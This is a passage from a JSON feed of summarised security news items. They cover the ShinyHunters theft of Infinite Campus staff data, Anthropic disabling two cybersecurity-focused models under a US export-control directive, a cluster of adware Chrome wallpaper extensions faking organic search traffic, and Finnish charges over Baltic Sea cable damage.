on its data leak site.\u003c/p\u003e\n\n\u003ch2 id=\"targeted-system-and-exposed-data\"\u003eTargeted system and exposed data\u003c/h2\u003e\n\n\u003cp\u003eInfinite Campus said the attacker targeted the company’s Salesforce instance. The company told affected customers that the exposed data contained names and contact details for school staff and other publicly available information. It said the majority of the data was directory information commonly found on school websites.\u003c/p\u003e\n\n\u003cp\u003eThe company also said it had no evidence that customer databases were compromised. According to the article, this means Infinite Campus framed the incident as involving its Salesforce records rather than customer database compromise.\u003c/p\u003e\n\n\u003ch2 id=\"leaked-archive-and-have-i-been-pwned-analysis\"\u003eLeaked archive and Have I Been Pwned analysis\u003c/h2\u003e\n\n\u003cp\u003eShinyHunters leaked a 1.2GB archive of documents allegedly containing Salesforce records with personally identifiable information and other internal corporate data. Have I Been Pwned analyzed the leaked data and said the breach exposed data from 137,100 accounts.\u003c/p\u003e\n\n\u003cp\u003eThe data elements listed by Have I Been Pwned included:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUnique names\u003c/li\u003e\n\u003cli\u003eEmail addresses\u003c/li\u003e\n\u003cli\u003eEmployers\u003c/li\u003e\n\u003cli\u003eJob titles\u003c/li\u003e\n\u003cli\u003ePhone numbers\u003c/li\u003e\n\u003cli\u003ePhysical addresses\u003c/li\u003e\n\u003cli\u003eUsernames\u003c/li\u003e\n\u003cli\u003eSupport tickets\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eHave I Been Pwned also summarized Infinite Campus’s customer notification, saying the company advised that the exposed data largely consisted of names and contact information for school staff and that most of it was directory information commonly found on school websites.\u003c/p\u003e\n\n\u003ch2 id=\"affected-parties\"\u003eAffected parties\u003c/h2\u003e\n\n\u003cp\u003eThe directly named victim organization is Infinite Campus. The affected accounts belonged to school staff, and the exposed information included both contact details and account-related information such as usernames and support tickets.\u003c/p\u003e\n\n\u003cp\u003eThe article states that Infinite Campus serves over 3,200 school districts in the United States. It also states that the company manages data for 11 million students in 46 states, although the reported exposed accounts in this incident were school staff accounts.\u003c/p\u003e\n\n\u003ch2 id=\"threat-actor-attribution\"\u003eThreat actor attribution\u003c/h2\u003e\n\n\u003cp\u003eShinyHunters claimed responsibility for the breach on its data leak site. Infinite Campus had not initially named the group, but described the attacker as part of a group known for targeting Salesforce accounts at hundreds of companies.\u003c/p\u003e\n\n\u003cp\u003eThe article says ShinyHunters has targeted many Salesforce customers over the past year. It says the group claimed to have stolen more than 1.5 billion records after breaching hundreds of companies in the Salesloft Drift hack and the Salesforce Aura campaign.\u003c/p\u003e\n\n\u003ch2 id=\"comparison-with-powerschool\"\u003eComparison with PowerSchool\u003c/h2\u003e\n\n\u003cp\u003eThe article compares the Infinite Campus incident with the December 2024 PowerSchool hack. It says the incidents are similar, but that the impact is vastly different because the PowerSchool breach affected 62 million students.\u003c/p\u003e\n\n\u003cp\u003eThe article also notes that the hacker behind the PowerSchool attack, a 19-year-old college student from Massachusetts, was sentenced to four years in prison after a guilty plea in May 2025.\u003c/p\u003e\n\n\u003ch2 id=\"broader-shinyhunters-activity\"\u003eBroader ShinyHunters activity\u003c/h2\u003e\n\n\u003cp\u003eBeyond Salesforce-related activity, the article says ShinyHunters more recently claimed responsibility for a new data theft campaign exploiting a zero-day vulnerability in Oracle’s PeopleSoft enterprise business software suite. According to the article, that campaign was used to steal data from over 100 organizations.\u003c/p\u003e\n\n\u003cp\u003eThe article names the University of Nottingham as one of the organizations included in that PeopleSoft-related activity. It does not provide additional technical details about the Infinite Campus intrusion beyond identifying the targeted Infinite Campus Salesforce instance and the exposed data types.\u003c/p\u003e\n","keyPoints":["The ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus.","Infinite Campus said the attacker targeted its Salesforce instance and that the exposed data consisted largely of names and contact information for school staff, mostly directory information commonly found on school websites.","Have I Been Pwned reported that the leaked data exposed 137,100 accounts, including unique names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.","ShinyHunters claimed responsibility for the breach on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with personally identifiable information and other internal corporate data.","Infinite Campus said it had no evidence that customer databases were compromised."],"insights":["The exposed Infinite Campus data included support tickets and usernames, showing the leak went beyond basic staff directory details described in customer notifications.","The Infinite Campus incident is part of a broader ShinyHunters pattern against Salesforce customers, with the group claiming more than 1.5 billion stolen records across hundreds of companies over the past year.","The article contrasts Infinite Campus with the PowerSchool breach, noting that both involved major K-12 education technology providers but the PowerSchool incident affected a far larger population of 62 million students.","Infinite Campus said it had no evidence that customer databases were compromised, indicating the reported impact was limited to its Salesforce instance rather than the core student information system databases."],"referencedReports":[{"title":"Infinite Campus breach","url":"https://haveibeenpwned.com/Breach/InfiniteCampus","publisher":"Have I Been Pwned","context":"The article says Have I Been Pwned analyzed the leaked Infinite Campus data and reported that 137,100 accounts were exposed.","category":"","primary":false}],"body":"\u003cp\u003eThe ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus. Infinite Campus is an EdTech company that provides a K-12 student information system to over 3,200 school districts in the United States. The company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus said the attacker targeted its Salesforce instance and that the exposed data consisted largely of names and contact information for school staff. The company told customers it had no evidence that customer databases were compromised. Have I Been Pwned later said the leaked data exposed 137,100 accounts, including names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters claimed responsibility on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with personally identifiable information and other internal corporate data. The article compares the incident with the December 2024 PowerSchool hack, while noting the PowerSchool breach affected 62 million students. It also says ShinyHunters has targeted many Salesforce customers over the past year and more recently claimed a PeopleSoft data theft campaign affecting over 100 organizations.\u003c/p\u003e\n"},{"n":6,"title":"Anthropic says US government forced it to disable cybersecurity AI models","source":"therecord.media","sourceColorIdx":7,"link":"https://therecord.media/anthropic-says-gov-forced-it-to-disable-cyber-ai-models","time":"12:31","priority":"SHOULD READ","score":82,"tldr":"Anthropic says a U.S. government export-control directive forced it to disable its Fable 5 and Mythos 5 cybersecurity AI models for all customers, including foreign nationals in the U.S. The company disputes the government’s stated jailbreak concerns and says the action was not transparent or technically justified.","briefOverview":"\u003cp\u003eAnthropic disabled two advanced cybersecurity-focused AI models, Fable 5 and Mythos 5, after receiving a U.S. government export control directive. The company said the directive barred foreign nationals from accessing the models, including foreign nationals inside the United States and Anthropic’s own employees. Anthropic said it had to disable the models for all customers to ensure compliance.\u003c/p\u003e\n\n\u003cp\u003eThe directive has not been made public, but Anthropic said it cited national security authorities. The article says this appears to be the first time such authorities have been used to restrict export of AI models rather than chips or hardware. Anthropic disputed the basis for the action and said the process was not transparent, fair, clear, or grounded in technical facts.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said it understands the government believes there is a method for bypassing or “jailbreaking” Fable 5, but said the government provided only verbal evidence. The company said its review of what it believes is the underlying report found only minor, previously known vulnerabilities that could also be reproduced with other publicly available models, including OpenAI’s GPT-5.5. Anthropic apologized to customers and said it is working to restore access as soon as possible.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eAnthropic said it disabled Fable 5 and Mythos 5, two of its most advanced cybersecurity-focused AI models, in response to a U.S. government export control directive. The company said the directive barred any foreign national from accessing the models. That restriction applied both abroad and inside the United States, including to Anthropic’s own employees.\u003c/p\u003e\n\n\u003cp\u003eBecause of the scope of the directive, Anthropic said it had to disable Fable 5 and Mythos 5 for all customers to ensure compliance. The directive itself has not been made public, but Anthropic said it cited national security authorities. The article says the action appears to be the first use of such authorities to curtail export of AI models rather than chips or hardware.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said its understanding is that the government believes it has become aware of a way to bypass or “jailbreak” Fable 5. The company said the government provided only verbal evidence of the technique. Anthropic said it reviewed what it believes is the underlying report and concluded the identified issues were minor, already known, and reproducible using other publicly available models, including OpenAI’s GPT-5.5.\u003c/p\u003e\n\n\u003cp\u003eThe company said it is complying with the directive while disputing its basis. Anthropic said a narrow potential jailbreak should not justify recalling a commercial model deployed to hundreds of millions of people. It also warned that applying the same standard across the industry would essentially halt new model deployments for all frontier model providers.\u003c/p\u003e\n\n\u003cp\u003eThe directive came two days after Anthropic CEO Dario Amodei published a policy essay calling for government legal authority to block unsafe AI deployments. Anthropic said it still supports such authority, but only through a statutory process that is transparent, fair, clear, and grounded in technical facts. The article also notes broader tensions with the Trump administration, including a February designation by Defense Secretary Pete Hegseth labeling Anthropic a “supply chain risk” after contract negotiations over military use of Claude broke down.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eAnthropic said the U.S. government forced it to disable two of its most advanced cybersecurity-focused AI models, Fable 5 and Mythos 5. The company said it acted in response to an export control directive issued by the U.S. government. According to Anthropic, the directive barred any foreign national from accessing the models.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said the directive covered foreign nationals both inside the United States and abroad. The company also said the order applied to its own employees. Because of that scope, Anthropic said the “net effect” was that it had to abruptly disable Fable 5 and Mythos 5 for all customers to ensure compliance.\u003c/p\u003e\n\n\u003ch2 id=\"significance-of-the-directive\"\u003eSignificance of the directive\u003c/h2\u003e\n\n\u003cp\u003eThe directive itself has not been made public. Anthropic said it cited national security authorities. The article states that the action appears to be the first time such authorities have been used to curtail export of AI models rather than chips or hardware.\u003c/p\u003e\n\n\u003cp\u003eAnthropic is complying with the directive but disputes its basis. The company said it disagrees that a narrow potential jailbreak should justify recalling a commercial model deployed to hundreds of millions of people. It also said that if the same standard were applied across the industry, it would essentially halt all new model deployments for frontier model providers.\u003c/p\u003e\n\n\u003ch2 id=\"technical-basis-described-by-anthropic\"\u003eTechnical basis described by Anthropic\u003c/h2\u003e\n\n\u003cp\u003eAnthropic said its understanding is that the government believes it has become aware of a method for bypassing, or “jailbreaking,” Fable 5. The company said the government provided only verbal evidence of this technique. No public version of the directive or technical evidence was described in the article.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said it reviewed what it believes is the underlying report. According to the company, the vulnerabilities identified in that material were minor and previously known. Anthropic also said the same issues were reproducible using other publicly available models, including OpenAI’s GPT-5.5.\u003c/p\u003e\n\n\u003ch2 id=\"affected-parties-and-impact\"\u003eAffected parties and impact\u003c/h2\u003e\n\n\u003cp\u003eThe immediate affected products are Fable 5 and Mythos 5, Anthropic’s advanced cybersecurity-focused AI models. Anthropic said the models had to be disabled for all customers because of the directive’s restrictions on access by foreign nationals. The company apologized for the disruption to customers.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said the order also affected its own workforce because it applied to foreign nationals inside the United States as well as abroad. The article does not provide a specific customer list, number of affected users, or duration for the outage. Anthropic said it believes the situation is a misunderstanding and is working to restore access as soon as possible.\u003c/p\u003e\n\n\u003ch2 id=\"anthropic-s-position-on-government-oversight\"\u003eAnthropic’s position on government oversight\u003c/h2\u003e\n\n\u003cp\u003eAnthropic said it supports giving the government authority to block unsafe AI deployments. However, the company said such authority should be exercised through a statutory process that is transparent, fair, clear, and grounded in technical facts. Anthropic said the current action did not adhere to those principles.\u003c/p\u003e\n\n\u003cp\u003eThe directive was issued two days after Anthropic CEO Dario Amodei published a policy essay calling for the government to have legal authority to block unsafe AI deployments. The article presents Anthropic’s position as supportive of government authority in principle, while opposed to the process and basis of this particular directive.\u003c/p\u003e\n\n\u003ch2 id=\"broader-political-and-business-context\"\u003eBroader political and business context\u003c/h2\u003e\n\n\u003cp\u003eThe article says the directive arrived amid escalating tensions between Anthropic and the Trump administration. In February, Defense Secretary Pete Hegseth designated Anthropic a “supply chain risk.” The article says that label has historically been applied to companies such as Huawei.\u003c/p\u003e\n\n\u003cp\u003eThe article says the designation followed a breakdown in contract negotiations over military use of Claude. It also notes that Anthropic filed for an initial public offering earlier in the month. Investors anticipated the IPO could value the company above $1 trillion, according to reporting cited in the article.\u003c/p\u003e\n\n\u003ch2 id=\"key-disclosed-facts\"\u003eKey disclosed facts\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAnthropic disabled Fable 5 and Mythos 5 on Friday.\u003c/li\u003e\n\u003cli\u003eThe company said it acted because of a U.S. government export control directive.\u003c/li\u003e\n\u003cli\u003eThe directive barred foreign nationals from accessing the models, including foreign nationals inside the United States.\u003c/li\u003e\n\u003cli\u003eAnthropic said the directive applied to its own employees.\u003c/li\u003e\n\u003cli\u003eThe directive has not been made public.\u003c/li\u003e\n\u003cli\u003eAnthropic said the government cited national security authorities.\u003c/li\u003e\n\u003cli\u003eAnthropic said the government’s concern appears to involve a possible jailbreak of Fable 5.\u003c/li\u003e\n\u003cli\u003eAnthropic said the government provided only verbal evidence of the technique.\u003c/li\u003e\n\u003cli\u003eAnthropic said its own review found minor, previously known issues reproducible in other publicly available models.\u003c/li\u003e\n\u003cli\u003eAnthropic said it is complying while disputing the directive’s basis.\u003c/li\u003e\n\u003cli\u003eAnthropic apologized to customers and said it is working to restore access.\u003c/li\u003e\n\u003c/ul\u003e\n","keyPoints":["Anthropic disabled its Fable 5 and Mythos 5 cybersecurity-focused AI models after receiving a U.S. government export control directive barring foreign nationals from accessing them.","Anthropic said the directive applied to foreign nationals both inside the United States and abroad, including the company’s own employees.","Anthropic said the government appears to believe it has become aware of a method for jailbreaking Fable 5, but the company said it received only verbal evidence of the technique.","Anthropic said its review found the identified vulnerabilities were minor, previously known, and reproducible using other publicly available models including OpenAI's GPT-5.5.","Anthropic said it supports government authority to block unsafe AI deployments only through a transparent, fair, clear statutory process grounded in technical facts."],"insights":["The directive appears to mark a shift in U.S. export control enforcement from restricting AI chips or hardware to restricting access to AI models themselves.","Because the order barred access by foreign nationals even inside the United States, Anthropic said it had to disable the models for all customers rather than limit access by geography.","Anthropic argued that applying the same standard across the industry would effectively halt new frontier model deployments, because the cited jailbreak concerns were also reproducible in other publicly available models.","The action came shortly after Anthropic’s CEO publicly supported giving the government legal authority to block unsafe AI deployments, highlighting the company’s distinction between supporting oversight in principle and opposing the process used in this case.","The dispute occurred amid broader tensions between Anthropic and the Trump administration, including the Defense Department’s earlier designation of Anthropic as a “supply chain risk.”"],"referencedReports":[],"body":"\u003cp\u003eAnthropic disabled two advanced cybersecurity-focused AI models, Fable 5 and Mythos 5, after receiving a U.S. government export control directive. The company said the directive barred foreign nationals from accessing the models, including foreign nationals inside the United States and Anthropic’s own employees. Anthropic said it had to disable the models for all customers to ensure compliance.\u003c/p\u003e\n\n\u003cp\u003eThe directive has not been made public, but Anthropic said it cited national security authorities. The article says this appears to be the first time such authorities have been used to restrict export of AI models rather than chips or hardware. Anthropic disputed the basis for the action and said the process was not transparent, fair, clear, or grounded in technical facts.\u003c/p\u003e\n\n\u003cp\u003eAnthropic said it understands the government believes there is a method for bypassing or “jailbreaking” Fable 5, but said the government provided only verbal evidence. The company said its review of what it believes is the underlying report found only minor, previously known vulnerabilities that could also be reproduced with other publicly available models, including OpenAI’s GPT-5.5. Anthropic apologized to customers and said it is working to restore access as soon as possible.\u003c/p\u003e\n"},{"n":8,"title":"152 Chrome Wallpaper Extensions with 105K Installs Linked to Adware and Fake Traffic","source":"thehackernews.com","sourceColorIdx":8,"link":"https://thehackernews.com/2026/06/152-chrome-wallpaper-extensions-with.html","time":"11:07","priority":"SHOULD READ","score":78,"tldr":"Researchers found 152 Chrome live-wallpaper extensions with about 105,000 installs that behaved like adware by tracking users despite store claims and generating fake “organic” Google traffic. The campaign appears financially motivated, using install and uninstall redirects to manipulate traffic attribution and share data with ad partners.","briefOverview":"\u003cp\u003eCybersecurity researchers discovered a network of 152 Google Chrome extensions that posed as new tab live wallpaper add-ons while distributing a potentially unwanted program family. The extensions collectively had 105,000 installs and were spread across 38 Chrome Web Store publisher accounts. The cluster used three brand backends: tabplugins.com, yowgames.com, and chromewallpaper.com.\u003c/p\u003e\n\n\u003cp\u003eSocket reported that the extensions’ Chrome Web Store listings said they would not collect or use user data, while their linked privacy policies said they logged IP addresses, ISP, click counts, and referrers. Those policies also said the data was shared with Google AdSense, DoubleClick, and third-party ad partners. The campaign was assessed as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation.\u003c/p\u003e\n\n\u003cp\u003eA sub-cluster of the extensions used hard-coded install and uninstall URLs in a JavaScript file named js/bg.js. The install URL included UTM parameters to make the extension’s tab opening appear like Google organic search traffic, while the uninstall URL used a google.com/url redirect wrapper to resemble genuine Google Search activity. The JavaScript files also contained a dormant capability to enumerate and delete IndexedDB databases on service worker start.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eCybersecurity researchers identified 152 Google Chrome extensions that acted as new tab live wallpaper add-ons and distributed a potentially unwanted program family. The extensions were collectively installed 105,000 times. They were spread across 38 Chrome Web Store publisher accounts and connected to three brand backends: tabplugins.com, yowgames.com, and chromewallpaper.com.\u003c/p\u003e\n\n\u003cp\u003eThe extensions used popular wallpaper themes, including football, anime, cars, games, and characters. Examples named in the article include Neymar - Football Live Wallpaper, Satoru Gojo Manga Live Wallpaper, Porsche 911 - Sports Car Live Wallpaper, Hello Kitty Wallpapers HD New Tab, and Spider-Man Miles Morales Swing Live Wallpaper. Several extension IDs were also listed for these examples.\u003c/p\u003e\n\n\u003cp\u003eSocket security researcher Kush Pandya said every Chrome Web Store listing declared that it would not collect or use user data. However, the linked privacy policy said the extensions logged IP addresses, ISP, click counts, and referrers. The policy also said that data was shared with Google AdSense, DoubleClick, and third-party ad partners.\u003c/p\u003e\n\n\u003cp\u003eA sub-cluster of the extensions defined two hard-coded URLs in js/bg.js that were triggered during install and uninstall operations. The install URL included UTM parameters such as utm_source=google, utm_medium=organic, and a campaign value tied to a wallpaper theme, making the extension’s tab opening appear as organic search traffic. The uninstall URL used a google.com/url redirect wrapper to make the event look like Google Search activity.\u003c/p\u003e\n\n\u003cp\u003eSocket said the campaign’s purpose was to artificially create the signal that traffic came from Google organic search, even though the visit was caused by the extension opening a tab on its own. The uninstall flow went further by using the google.com/url format associated with real search-result clicks, including ved and usg tokens. The JavaScript files also included a dormant capability to enumerate and delete IndexedDB databases when a service worker starts.\u003c/p\u003e\n\n\u003cp\u003eThe campaign was assessed as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation. Its exact provenance remains unknown. The article says available circumstantial indicators suggest it could have originated from Turkey.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eCybersecurity researchers discovered a network of 152 Google Chrome extensions that presented themselves as new tab live wallpaper add-ons. According to the article, the extensions distributed a potentially unwanted program family and were collectively installed 105,000 times.\u003c/p\u003e\n\n\u003cp\u003eThe cluster spanned 38 separate Chrome Web Store publisher accounts and used three brand backends:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003etabplugins.com\u003c/li\u003e\n\u003cli\u003eyowgames.com\u003c/li\u003e\n\u003cli\u003echromewallpaper.com\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe campaign was assessed as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation. The article states that its exact provenance remains unknown, though available circumstantial indicators suggest it could have originated from Turkey.\u003c/p\u003e\n\n\u003ch2 id=\"extension-cluster-and-examples\"\u003eExtension Cluster and Examples\u003c/h2\u003e\n\n\u003cp\u003eThe extensions were themed around popular characters, sports, anime, cars, games, and wallpapers. The article lists examples such as:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eNeymar - Football Live Wallpaper\u003c/li\u003e\n\u003cli\u003eSatoru Gojo Manga Live Wallpaper\u003c/li\u003e\n\u003cli\u003ePorsche 911 - Sports Car Live Wallpaper\u003c/li\u003e\n\u003cli\u003eSatoru Gojo Live Wallpaper\u003c/li\u003e\n\u003cli\u003eHello Kitty Wallpapers HD New Tab\u003c/li\u003e\n\u003cli\u003ePusheen Cat Wallpapers HD New Tab\u003c/li\u003e\n\u003cli\u003eSpider-Man Miles Morales Swing Live Wallpaper\u003c/li\u003e\n\u003cli\u003eBMW M3 Neon Night Drive Live Wallpaper\u003c/li\u003e\n\u003cli\u003eDeath Note Anime Wallpapers HD New Tab\u003c/li\u003e\n\u003cli\u003eTanjiro - Demon Slayer Live Wallpaper\u003c/li\u003e\n\u003cli\u003eMinecraft Sakura Pond Live Wallpaper\u003c/li\u003e\n\u003cli\u003eZenitsu Agatsuma Live Wallpaper\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article also includes extension IDs for the named examples, indicating that the researchers identified specific Chrome Web Store extensions in the cluster.\u003c/p\u003e\n\n\u003ch2 id=\"data-collection-and-privacy-policy-conflict\"\u003eData Collection and Privacy Policy Conflict\u003c/h2\u003e\n\n\u003cp\u003eSocket security researcher Kush Pandya said the extensions’ Chrome Web Store listings all declared that they would not collect or use user data. However, the linked privacy policies admitted the opposite.\u003c/p\u003e\n\n\u003cp\u003eAccording to the article, those privacy policies said the extensions logged:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIP addresses\u003c/li\u003e\n\u003cli\u003eISP information\u003c/li\u003e\n\u003cli\u003eClick counts\u003c/li\u003e\n\u003cli\u003eReferrers\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe same policies also said that data was shared with Google AdSense, DoubleClick, and third-party ad partners. This created a direct discrepancy between what the Chrome Web Store listings claimed and what the linked privacy policies disclosed.\u003c/p\u003e\n\n\u003ch2 id=\"install-and-uninstall-traffic-attribution-behavior\"\u003eInstall and Uninstall Traffic Attribution Behavior\u003c/h2\u003e\n\n\u003cp\u003eA sub-cluster of the identified extensions contained two hard-coded URLs in a JavaScript file named \u003ccode\u003ejs/bg.js\u003c/code\u003e. These URLs were activated during install and uninstall operations.\u003c/p\u003e\n\n\u003cp\u003eThe install URL included Urchin Tracking Module parameters, including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eutm_source=google\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eutm_medium=organic\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eutm_campaign=tanjiro-demon-slayer-live-wallpaper\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article says this disguised the extension opening a tab on install as an “organic” search. Socket explained that the visit was not caused by a person searching Google, but by the extension opening a tab on its own and marking it as having arrived from Google organic search.\u003c/p\u003e\n\n\u003cp\u003eThe uninstall URL used a \u003ccode\u003egoogle.com/url\u003c/code\u003e redirect wrapper. The article says this masqueraded the uninstall as genuine Google Search activity. Socket said the uninstall ping used the exact \u003ccode\u003egoogle.com/url\u003c/code\u003e format Google uses for real search-result clicks, including signed \u003ccode\u003eved\u003c/code\u003e and \u003ccode\u003eusg\u003c/code\u003e tokens, so the hit looked like a human clicking a Google result.\u003c/p\u003e\n\n\u003ch2 id=\"purpose-of-the-traffic-behavior\"\u003ePurpose of the Traffic Behavior\u003c/h2\u003e\n\n\u003cp\u003eThe article explains that organic search refers to unpaid search engine listings generated by algorithms and placed based on factors such as relevance, authority, and search engine optimization. Socket said the extensions attempted to artificially create that signal.\u003c/p\u003e\n\n\u003cp\u003eThe article describes this as fabricating the origin of the extensions’ own traffic. Rather than a real user arriving from Google Search, the extension opened a tab automatically and made the traffic appear to come from Google organic search.\u003c/p\u003e\n\n\u003ch2 id=\"dormant-indexeddb-capability\"\u003eDormant IndexedDB Capability\u003c/h2\u003e\n\n\u003cp\u003eThe JavaScript files also contained a dormant capability related to IndexedDB. According to the article, the code could enumerate and delete every IndexedDB database it could find when a service worker starts.\u003c/p\u003e\n\n\u003cp\u003eThe article does not state that this capability was actively used, only that it was present in dormant form.\u003c/p\u003e\n\n\u003ch2 id=\"assessment-and-impact\"\u003eAssessment and Impact\u003c/h2\u003e\n\n\u003cp\u003eThe campaign was characterized as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation. The direct measured impact stated in the article was that the 152 extensions had been collectively installed 105,000 times.\u003c/p\u003e\n\n\u003cp\u003eThe article does not identify a named threat actor. It says the campaign’s exact provenance is unknown, while available circumstantial indicators suggest it could have originated from Turkey.\u003c/p\u003e\n","keyPoints":["Cybersecurity researchers discovered 152 Google Chrome extensions posing as new tab live wallpaper add-ons that distribute a potentially unwanted program family.","The extensions span 38 Chrome Web Store publisher accounts, use the tabplugins.com, yowgames.com, and chromewallpaper.com backends, and have been installed 105,000 times collectively.","Socket said the Chrome Web Store listings claimed the extensions did not collect or use user data, while linked privacy policies stated that they log IP addresses, ISP, click counts, and referrers and share data with ad partners.","Some extensions used hard-coded install and uninstall URLs to make extension-driven visits appear as Google organic search traffic or genuine Google Search activity.","Socket assessed the campaign as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation, with circumstantial indicators suggesting a possible origin in Turkey."],"insights":["The extensions’ Chrome Web Store privacy declarations conflicted with their linked privacy policies, making policy mismatches a practical signal for identifying suspicious browser extensions.","The campaign used Google-style attribution artifacts, including UTM parameters and google.com/url redirect wrappers with ved and usg tokens, to make automated extension activity resemble legitimate organic search behavior.","A dormant function in the JavaScript files could enumerate and delete IndexedDB databases on service worker start, indicating the extensions contained capabilities beyond wallpaper customization and traffic generation.","The operation spread across 38 publisher accounts and three backend domains, showing that the campaign was structured to distribute risk and scale beyond a single Chrome Web Store identity."],"referencedReports":[{"title":"152 Chrome Live Wallpaper Extensions Hid Ad Tracking","url":"https://socket.dev/blog/152-chrome-live-wallpaper-extensions-hid-ad-tracking#Attribution","publisher":"Socket","context":"The article cites Socket security researcher Kush Pandya and relies on Socket’s analysis of the Chrome extension cluster, its privacy-policy discrepancies, and traffic-attribution-fraud behavior.","category":"","primary":false}],"body":"\u003cp\u003eCybersecurity researchers discovered a network of 152 Google Chrome extensions that posed as new tab live wallpaper add-ons while distributing a potentially unwanted program family. The extensions collectively had 105,000 installs and were spread across 38 Chrome Web Store publisher accounts. The cluster used three brand backends: tabplugins.com, yowgames.com, and chromewallpaper.com.\u003c/p\u003e\n\n\u003cp\u003eSocket reported that the extensions’ Chrome Web Store listings said they would not collect or use user data, while their linked privacy policies said they logged IP addresses, ISP, click counts, and referrers. Those policies also said the data was shared with Google AdSense, DoubleClick, and third-party ad partners. The campaign was assessed as a financially motivated commercial adware and traffic-attribution-fraud affiliate operation.\u003c/p\u003e\n\n\u003cp\u003eA sub-cluster of the extensions used hard-coded install and uninstall URLs in a JavaScript file named js/bg.js. The install URL included UTM parameters to make the extension’s tab opening appear like Google organic search traffic, while the uninstall URL used a google.com/url redirect wrapper to resemble genuine Google Search activity. The JavaScript files also contained a dormant capability to enumerate and delete IndexedDB databases on service worker start.\u003c/p\u003e\n"},{"n":5,"title":"Finland brings charges against cargo ship officers for cutting submarine cables","source":"therecord.media","sourceColorIdx":7,"link":"https://therecord.media/finland-brings-charges-against-cargo-ship-undersea-cables","time":"13:30","priority":"MAY READ","score":72,"tldr":"Finnish prosecutors charged the captain and bosun of the cargo ship Fitburg with damaging two Baltic Sea subsea telecom cables and attempting to damage eight others by allegedly dragging an anchor for at least 130 kilometers. The defendants deny wrongdoing and are expected to challenge Finland’s jurisdiction because the cable damage occurred outside Finnish territorial waters.","briefOverview":"\u003cp\u003eThe Finnish Prosecution Service announced charges against the captain and bosun of the cargo vessel Fitburg over damage to submarine infrastructure in the Baltic Sea. Prosecutors said the officers are accused of damaging two subsea telecommunications cables and attempting to damage eight other subsea connections. Both defendants deny committing the offenses.\u003c/p\u003e\n\n\u003cp\u003eThe Fitburg had been transporting sanctioned steel products from Russia to Israel, according to Finnish Customs, and was seized after cable faults were detected in the region. Prosecutors said the vessel is believed to have dragged its damaged anchor along the seabed for at least 130 kilometers until Finnish authorities halted its movement. The case is significant because the defendants are expected to challenge Finland’s jurisdiction, as the cable damage locations are outside Finnish territorial waters.\u003c/p\u003e\n\n\u003cp\u003eThe case follows a previous Finnish attempt to prosecute senior officers of the Russia-linked Eagle S tanker, which damaged multiple cables on Christmas Day 2024. That prosecution collapsed amid legal rulings disputing Finland’s jurisdiction. Recent Baltic Sea cable faults prompted NATO to increase patrols, though officials from several European countries told Recorded Future News there is growing confidence that the incidents were accidental rather than directed by the Kremlin.\u003c/p\u003e\
